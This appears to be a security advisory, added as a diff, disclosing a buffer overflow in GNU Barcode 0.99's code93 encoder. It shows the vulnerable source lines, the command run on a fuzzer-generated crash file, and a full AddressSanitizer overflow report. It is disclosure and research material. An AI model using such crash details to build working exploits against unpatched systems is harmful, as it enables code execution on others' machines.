@@ -1,0 +1,188 @@
+# GNU Barcode 0.99 - Buffer Overflow
+# Vendor: The GNU Project | Free Software Foundation, Inc.
+# Product web page: https://www.gnu.org/software/barcode/
+# https://directory.fsf.org/wiki/Barcode
+# Author: Gjoko 'LiquidWorm' Krstic
+# Tested on: Ubuntu 16.04.4
+# Affected version: 0.99
+
+# Summary: GNU Barcode is a tool to convert text strings to printed bars.
+# It supports a variety of standard codes to represent the textual strings
+# and creates postscript output.
+
+# Desc: The vulnerability is caused due to a boundary error in the processing
+# of an input file, which can be exploited to cause a buffer overflow when a
+# user processes e.g. a specially crafted file. Successful exploitation could
+# allow execution of arbitrary code on the affected machine.
+
+
+code93.c:
+
+165: strcat(partial, codeset[code]);
+166: checksum_str[checksum_len++] = code;
+167: 
+168: /* Encode the second character */
+169: code = strchr(alphabet, shiftset2[(int)(text[i])]) - alphabet;
+170: strcat(partial, codeset[code]);
+171: checksum_str[checksum_len++] = code;
+
+lqwrm@metalgear:~/research/barcode-0.99$ ./barcode -i id:000034,sig:06,src:000000,op:havoc,rep:128
+%!PS-Adobe-2.0
+%%Creator: "barcode", libbarcode sample frontend
+%%DocumentPaperSizes: A4
+%%EndComments
+%%EndProlog
+
+%%Page: 1 1
+
+% Printing barcode for "W+G$A+M%KWWGWWWWWWWW9WW", scaled  1.00, encoded using "code 39"
+% The space/bar succession is represented by the following widths (space first):
+% 01311313111333111111113111313111111133131131313111131111311311311131311313111131111131313113111111331333111111133311111111111133131333111111133311111113331111111333111111133311111113331111111333111111133311111111133113111333111111133311111113111113311131131311
+[
+%  height  xpos   ypos  width       height  xpos   ypos  width
+   [75.00  10.50  15.00  0.85]      [75.00  14.50  15.00  0.85]
+   [75.00  17.50  15.00  2.85]      [75.00  21.50  15.00  2.85]
+   [75.00  24.50  15.00  0.85]      [70.00  27.50  20.00  2.85]
+   [70.00  33.50  20.00  2.85]      [70.00  36.50  20.00  0.85]
+   [70.00  38.50  20.00  0.85]      [70.00  40.50  20.00  0.85]
+   [70.00  42.50  20.00  0.85]      [70.00  46.50  20.00  0.85]
+   [70.00  48.50  20.00  0.85]      [70.00  52.50  20.00  0.85]
+   [70.00  56.50  20.00  0.85]      [70.00  58.50  20.00  0.85]
+   [70.00  60.50  20.00  0.85]      [70.00  62.50  20.00  0.85]
+   [70.00  67.50  20.00  2.85]      [70.00  71.50  20.00  2.85]
+   [70.00  74.50  20.00  0.85]      [70.00  78.50  20.00  0.85]
+   [70.00  82.50  20.00  0.85]      [70.00  86.50  20.00  0.85]
+   [70.00  88.50  20.00  0.85]      [70.00  91.50  20.00  2.85]
+   [70.00  94.50  20.00  0.85]      [70.00  96.50  20.00  0.85]
+   [70.00 100.50  20.00  0.85]      [70.00 103.50  20.00  2.85]
+   [70.00 106.50  20.00  0.85]      [70.00 110.50  20.00  0.85]
+   [70.00 112.50  20.00  0.85]      [70.00 116.50  20.00  0.85]
+   [70.00 120.50  20.00  0.85]      [70.00 123.50  20.00  2.85]
+   [70.00 127.50  20.00  2.85]      [70.00 130.50  20.00  0.85]
+   [70.00 132.50  20.00  0.85]      [70.00 136.50  20.00  0.85]
+   [70.00 138.50  20.00  0.85]      [70.00 140.50  20.00  0.85]
+   [70.00 144.50  20.00  0.85]      [70.00 148.50  20.00  0.85]
+   [70.00 152.50  20.00  0.85]      [70.00 155.50  20.00  2.85]
+   [70.00 158.50  20.00  0.85]      [70.00 160.50  20.00  0.85]
+   [70.00 162.50  20.00  0.85]      [70.00 167.50  20.00  2.85]
+   [70.00 171.50  20.00  2.85]      [70.00 177.50  20.00  2.85]
+   [70.00 180.50  20.00  0.85]      [70.00 182.50  20.00  0.85]
+   [70.00 184.50  20.00  0.85]      [70.00 187.50  20.00  2.85]
+   [70.00 193.50  20.00  2.85]      [70.00 196.50  20.00  0.85]
+   [70.00 198.50  20.00  0.85]      [70.00 200.50  20.00  0.85]
+   [70.00 202.50  20.00  0.85]      [70.00 204.50  20.00  0.85]
+   [70.00 206.50  20.00  0.85]      [70.00 211.50  20.00  2.85]
+   [70.00 215.50  20.00  2.85]      [70.00 219.50  20.00  2.85]
+   [70.00 225.50  20.00  2.85]      [70.00 228.50  20.00  0.85]
+   [70.00 230.50  20.00  0.85]      [70.00 232.50  20.00  0.85]
+   [70.00 235.50  20.00  2.85]      [70.00 241.50  20.00  2.85]
+   [70.00 244.50  20.00  0.85]      [70.00 246.50  20.00  0.85]
+   [70.00 248.50  20.00  0.85]      [70.00 251.50  20.00  2.85]
+   [70.00 257.50  20.00  2.85]      [70.00 260.50  20.00  0.85]
+   [70.00 262.50  20.00  0.85]      [70.00 264.50  20.00  0.85]
+   [70.00 267.50  20.00  2.85]      [70.00 273.50  20.00  2.85]
+   [70.00 276.50  20.00  0.85]      [70.00 278.50  20.00  0.85]
+   [70.00 280.50  20.00  0.85]      [70.00 283.50  20.00  2.85]
+   [70.00 289.50  20.00  2.85]      [70.00 292.50  20.00  0.85]
+   [70.00 294.50  20.00  0.85]      [70.00 296.50  20.00  0.85]
+   [70.00 299.50  20.00  2.85]      [70.00 305.50  20.00  2.85]
+   [70.00 308.50  20.00  0.85]      [70.00 310.50  20.00  0.85]
+   [70.00 312.50  20.00  0.85]      [70.00 315.50  20.00  2.85]
+   [70.00 321.50  20.00  2.85]      [70.00 324.50  20.00  0.85]
+   [70.00 326.50  20.00  0.85]      [70.00 328.50  20.00  0.85]
+   [70.00 331.50  20.00  2.85]      [70.00 337.50  20.00  2.85]
+   [70.00 340.50  20.00  0.85]      [70.00 342.50  20.00  0.85]
+   [70.00 344.50  20.00  0.85]      [70.00 346.50  20.00  0.85]
+   [70.00 349.50  20.00  2.85]      [70.00 354.50  20.00  0.85]
+   [70.00 357.50  20.00  2.85]      [70.00 360.50  20.00  0.85]
+   [70.00 363.50  20.00  2.85]      [70.00 369.50  20.00  2.85]
+   [70.00 372.50  20.00  0.85]      [70.00 374.50  20.00  0.85]
+   [70.00 376.50  20.00  0.85]      [70.00 379.50  20.00  2.85]
+   [70.00 385.50  20.00  2.85]      [70.00 388.50  20.00  0.85]
+   [70.00 390.50  20.00  0.85]      [70.00 392.50  20.00  0.85]
+   [70.00 395.50  20.00  2.85]      [70.00 398.50  20.00  0.85]
+   [70.00 400.50  20.00  0.85]      [70.00 403.50  20.00  2.85]
+   [70.00 408.50  20.00  0.85]      [75.00 410.50  15.00  0.85]
+   [75.00 414.50  15.00  0.85]      [75.00 417.50  15.00  2.85]
+   [75.00 421.50  15.00  2.85]      [75.00 424.50  15.00  0.85]
+
+]	{ {} forall setlinewidth moveto 0 exch rlineto stroke} bind forall
+[
+%   char    xpos   ypos fontsize
+    [(W)   32.00  10.00 12.00]
+    [(+)   48.00  10.00  0.00]
+    [(G)   64.00  10.00  0.00]
+    [($)   80.00  10.00  0.00]
+    [(A)   96.00  10.00  0.00]
+    [(+)  112.00  10.00  0.00]
+    [(M)  128.00  10.00  0.00]
+    [(%)  144.00  10.00  0.00]
+    [(K)  160.00  10.00  0.00]
+    [(W)  176.00  10.00  0.00]
+    [(W)  192.00  10.00  0.00]
+    [(G)  208.00  10.00  0.00]
+    [(W)  224.00  10.00  0.00]
+    [(W)  240.00  10.00  0.00]
+    [(W)  256.00  10.00  0.00]
+    [(W)  272.00  10.00  0.00]
+    [(W)  288.00  10.00  0.00]
+    [(W)  304.00  10.00  0.00]
+    [(W)  320.00  10.00  0.00]
+    [(W)  336.00  10.00  0.00]
+    [(9)  352.00  10.00  0.00]
+    [(W)  368.00  10.00  0.00]
+    [(W)  384.00  10.00  0.00]
+]   { {} forall dup 0.00 ne {
+	/Helvetica findfont exch scalefont setfont
+    } {pop} ifelse
+    moveto show} bind forall
+% End barcode for "W+G$A+M%KWWGWWWWWWWW9WW"
+
+showpage
+%%Page: 2 2
+
+=================================================================
+==11076==ERROR: AddressSanitizer: global-buffer-overflow on address 0x00000043bc02 at pc 0x00000042189a bp 0x7fff2f160c00 sp 0x7fff2f160bf0
+READ of size 1 at 0x00000043bc02 thread T0
+    #0 0x421899 in Barcode_93_encode /home/lqwrm/research/barcode-0.99/code93.c:169
+    #1 0x409ac2 in Barcode_Encode_and_Print /home/lqwrm/research/barcode-0.99/library.c:234
+    #2 0x402319 in main /home/lqwrm/research/barcode-0.99/main.c:564
+    #3 0x7f9b8745282f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
+    #4 0x404708 in _start (/home/lqwrm/research/barcode-0.99/barcode+0x404708)
+
+0x00000043bc02 is located 32 bytes to the right of global variable '*.LC6' defined in 'code93.c' (0x43bbe0) of size 2
+  '*.LC6' is ascii string '1'
+0x00000043bc02 is located 30 bytes to the left of global variable 'CSWTCH.16' defined in 'code93.c:146:5' (0x43bc20) of size 48
+SUMMARY: AddressSanitizer: global-buffer-overflow /home/lqwrm/research/barcode-0.99/code93.c:169 Barcode_93_encode
+Shadow bytes around the buggy address:
+  0x00008007f730: f9 f9 f9 f9 00 00 00 00 00 00 00 00 00 00 00 00
+  0x00008007f740: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x00008007f750: 00 00 00 00 07 f9 f9 f9 f9 f9 f9 f9 00 f9 f9 f9
+  0x00008007f760: f9 f9 f9 f9 02 f9 f9 f9 f9 f9 f9 f9 07 f9 f9 f9
+  0x00008007f770: f9 f9 f9 f9 00 02 f9 f9 f9 f9 f9 f9 02 f9 f9 f9
+=>0x00008007f780:[f9]f9 f9 f9 00 00 00 00 00 00 f9 f9 f9 f9 f9 f9
+  0x00008007f790: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x00008007f7a0: 01 f9 f9 f9 f9 f9 f9 f9 00 00 00 00 00 00 00 00
+  0x00008007f7b0: 00 00 00 00 00 00 00 00 01 f9 f9 f9 f9 f9 f9 f9
+  0x00008007f7c0: 07 f9 f9 f9 f9 f9 f9 f9 07 f9 f9 f9 f9 f9 f9 f9
+  0x00008007f7d0: 07 f9 f9 f9 f9 f9 f9 f9 07 f9 f9 f9 f9 f9 f9 f9
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Heap right redzone:      fb
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack partial redzone:   f4
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+==11076==ABORTING
